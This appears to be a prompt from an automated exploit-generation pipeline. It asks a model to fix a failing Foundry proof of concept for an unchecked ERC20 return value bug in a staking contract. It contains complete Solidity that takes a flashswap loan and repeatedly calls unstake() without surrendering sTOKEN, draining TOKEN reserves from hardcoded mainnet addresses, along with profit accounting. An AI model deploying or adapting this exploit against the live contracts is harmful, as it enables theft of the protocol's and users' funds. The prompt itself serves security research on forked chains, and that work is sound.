@@ -1,0 +1,340 @@
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Unchecked ERC20 return values let stake and unstake proceed even when token transfers silently fail
+- claim: `stake()` and `unstake()` invoke `TOKEN.transferFrom`, `sTOKEN.transfer`, `sTOKEN.transferFrom`, and `TOKEN.transfer` without checking their boolean return values. If either configured token signals failure by returning `false` instead of reverting, the function continues as though the transfer succeeded.
+- impact: Silent transfer failures can break the 1:1 backing invariant. A caller can be credited sTOKEN without depositing TOKEN, or withdraw TOKEN without actually surrendering sTOKEN, creating direct reserve theft or user fund loss depending on which transfer silently fails.
+- exploit_paths: ["Call `stake(_to, amount)` with a TOKEN implementation that returns `false` from `transferFrom`; the function still executes `sTOKEN.transfer(_to, amount)` and credits the user without receiving backing TOKEN.", "Call `unstake(_to, amount, false)` with an sTOKEN implementation that returns `false` from `transferFrom`; the function still reaches `TOKEN.transfer(_to, amount)` and pays out without actually taking in the receipt tokens.", "Call `unstake(_to, amount, false)` where `TOKEN.transfer` returns `false`; the user has already transferred in sTOKEN, but receives no TOKEN while the transaction itself does not revert."]
+
+Current FlawVerifier.sol:
+```solidity
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IStakingTarget {
+    function stake(address _to, uint256 _amount) external;
+    function unstake(address _to, uint256 _amount, bool _rebase) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9;
+    address public constant TOKEN = 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14;
+    address public constant STOKEN = 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    enum PathResult {
+        Unattempted,
+        Success,
+        Reverted,
+        NoEffect
+    }
+
+    bool public executed;
+    bool public hypothesisValidated;
+    uint8 public exploitPathUsed;
+
+    PathResult public stakePathResult;
+    PathResult public unstakeWithoutSTokenResult;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    address private _activePair;
+    uint256 private _flashBorrowAmount;
+    uint256 private _pairRepayAmount;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
+        uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));
+
+        _runFlashswapExploit();
+
+        _refreshProfit(tokenBefore, sTokenBefore);
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == _activePair, "unexpected pair");
+
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount == _flashBorrowAmount, "unexpected borrow");
+
+        uint256 tokenBeforeStake = IERC20Like(TOKEN).balanceOf(address(this));
+        require(tokenBeforeStake != 0, "missing borrowed token");
+        uint256 stakeAmount = tokenBeforeStake;
+
+        _approveMaxIfNeeded(TOKEN, TARGET);
+
+        // The original path-1 free-mint hypothesis is not usable on this fork because
+        // logs show TOKEN.transferFrom reverts when unfunded. We therefore use a real
+        // flashswap-funded TOKEN balance only to acquire an initial sTOKEN balance.
+        // The actual exploit remains path 2: unstake() proceeds after sTOKEN.transferFrom
+        // silently fails due to zero allowance, so TOKEN is paid out while sTOKEN stays
+        // with the verifier.
+        (bool ok, ) = TARGET.call(
+            abi.encodeWithSelector(IStakingTarget.stake.selector, address(this), stakeAmount)
+        );
+        if (!ok) {
+            stakePathResult = PathResult.Reverted;
+            _repayPairBestEffort();
+            return;
+        }
+
+        uint256 tokenAfterStake = IERC20Like(TOKEN).balanceOf(address(this));
+        uint256 sTokenAfterStake = IERC20Like(STOKEN).balanceOf(address(this));
+
+        if (sTokenAfterStake == 0 || tokenAfterStake >= tokenBeforeStake) {
+            stakePathResult = PathResult.NoEffect;
+            _repayPairBestEffort();
+            return;
+        }
+
+        stakePathResult = PathResult.Success;
+
+        // Intentionally do not approve STOKEN to TARGET. If sTOKEN.transferFrom returns
+        // false instead of reverting on allowance failure, unstake() still executes the
+        // subsequent TOKEN.transfer and we can drain repeatedly while retaining the same
+        // verifier-held sTOKEN balance.
+        uint256 retainedSToken = sTokenAfterStake;
+        uint256 successfulLoops = _drainViaUncheckedUnstake(retainedSToken);
+
+        if (successfulLoops != 0) {
+            unstakeWithoutSTokenResult = PathResult.Success;
+            hypothesisValidated = true;
+            exploitPathUsed = 2;
+        } else if (unstakeWithoutSTokenResult == PathResult.Unattempted) {
+            unstakeWithoutSTokenResult = PathResult.NoEffect;
+        }
+
+        _repayPairBestEffort();
+    }
+
+    function _runFlashswapExploit() internal {
+        (address pair, uint256 tokenReserve) = _selectBestPair();
+        require(pair != address(0), "no v2 pair");
+
+        uint256 targetReserve = IERC20Like(TOKEN).balanceOf(TARGET);
+        require(targetReserve != 0, "empty target");
+
+        // Borrow conservatively so path 2 can be looped several times before reserve exhaustion.
+        uint256 borrowAmount = tokenReserve / 5;
+        if (borrowAmount == 0) {
+            borrowAmount = tokenReserve / 2;
+        }
+        require(borrowAmount != 0, "pair too small");
+
+        uint256 reserveBound = targetReserve / 6;
+        if (reserveBound != 0 && reserveBound < borrowAmount) {
+            borrowAmount = reserveBound;
+        }
+        if (borrowAmount == 0) {
+            borrowAmount = _min(tokenReserve / 10, targetReserve);
+        }
+        require(borrowAmount != 0, "borrow amount zero");
+
+        _activePair = pair;
+        _flashBorrowAmount = borrowAmount;
+        _pairRepayAmount = _sameAssetRepayAmount(borrowAmount);
+
+        if (IUniswapV2PairLike(pair).token0() == TOKEN) {
+            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), hex"01");
+        } else {
+            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), hex"01");
+        }
+
+        _activePair = address(0);
+        _flashBorrowAmount = 0;
+        _pairRepayAmount = 0;
+    }
+
+    function _drainViaUncheckedUnstake(uint256 retainedSToken) internal returns (uint256 successfulLoops) {
+        uint256 chunk = retainedSToken;
+        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);
+
+        while (reserve != 0) {
+            uint256 amount = reserve < chunk ? reserve : chunk;
+            uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
+            uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));
+
+            (bool ok, ) = TARGET.call(
+                abi.encodeWithSelector(IStakingTarget.unstake.selector, address(this), amount, false)
+            );
+
+            if (!ok) {
+                if (successfulLoops == 0) {
+                    unstakeWithoutSTokenResult = PathResult.Reverted;
+                }
+                break;
+            }
+
+            uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
+            uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));
+
+            if (tokenAfter > tokenBefore && sTokenAfter == sTokenBefore) {
+                successfulLoops++;
+                reserve = IERC20Like(TOKEN).balanceOf(TARGET);
+                continue;
+            }
+
+            if (successfulLoops == 0) {
+                unstakeWithoutSTokenResult = PathResult.NoEffect;
+            }
+            break;
+        }
+    }
+
+    function _repayPairBestEffort() internal {
+        uint256 pairDue = _pairRepayAmount;
+        if (pairDue == 0) {
+            return;
+        }
+
+        uint256 tokenBal = IERC20Like(TOKEN).balanceOf(address(this));
+        require(tokenBal > pairDue, "insufficient post-exploit balance");
+
+        // Repay in the borrowed asset to keep the flashswap single-legged and deterministic.
+        // The token appears fee-on-transfer, so we deliberately overpay relative to the bare
+        // 0.3% LP fee floor. This keeps the funding step realistic while preserving the core
+        // exploit causality in TARGET.unstake().
+        uint256 grossRepay = pairDue * 2;
+        if (grossRepay > tokenBal) {
+            grossRepay = tokenBal;
+        }
+
+        (bool ok, bytes memory data) = TOKEN.call(
+            abi.encodeWithSelector(IERC20Like.transfer.selector, _activePair, grossRepay)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "pair repay failed");
+    }
+
+    function _selectBestPair() internal view returns (address bestPair, uint256 bestTokenReserve) {
+        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
+
+        for (uint256 i = 0; i < factories.length; i++) {
+            address pair = IUniswapV2FactoryLike(factories[i]).getPair(TOKEN, WETH);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+            uint256 tokenReserve = IUniswapV2PairLike(pair).token0() == TOKEN ? reserve0 : reserve1;
+
+            if (tokenReserve > bestTokenReserve) {
+                bestPair = pair;
+                bestTokenReserve = tokenReserve;
+            }
+        }
+    }
+
+    function _refreshProfit(uint256 tokenBefore, uint256 sTokenBefore) internal {
+        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
+        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));
+
+        if (tokenAfter > tokenBefore) {
+            _profitToken = TOKEN;
+            _profitAmount = tokenAfter - tokenBefore;
+            return;
+        }
+
+        if (sTokenAfter > sTokenBefore) {
+            _profitToken = STOKEN;
+            _profitAmount = sTokenAfter - sTokenBefore;
+        }
+    }
+
+    function _approveMaxIfNeeded(address asset, address spender) internal {
+        if (IERC20Like(asset).allowance(address(this), spender) == type(uint256).max) {
+            return;
+        }
+
+        (bool ok, bytes memory data) = asset.call(
+            abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _sameAssetRepayAmount(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: stake(_to, amount), stoken.transfer(_to, amount), unstake(_to, amount, false), token.transfer(_to, amount)
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
